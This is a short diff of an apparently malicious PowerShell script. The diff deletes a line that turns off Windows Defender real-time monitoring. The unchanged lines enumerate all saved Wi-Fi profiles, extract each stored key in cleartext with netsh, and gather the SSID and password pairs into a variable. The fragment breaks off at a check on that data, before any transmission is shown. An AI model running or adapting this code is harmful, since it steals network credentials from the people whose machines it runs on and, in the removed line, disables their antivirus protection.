@@ -1,4 +1,3 @@
-Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue
 $w = netsh wlan show prof | sls ':(.+)$' | %{$_.Matches.Groups[1].Value.Trim()} | %{$n=$_; $k=(netsh wlan show prof name="$n" key=clear | sls 'Key Content\W+:(.+)$' | %{$_.Matches.Groups[1].Value.Trim()}); if($k){"SSID:$n | Pass:$k"}}
 $data = $w | Out-String
 if ($data.Trim()) {
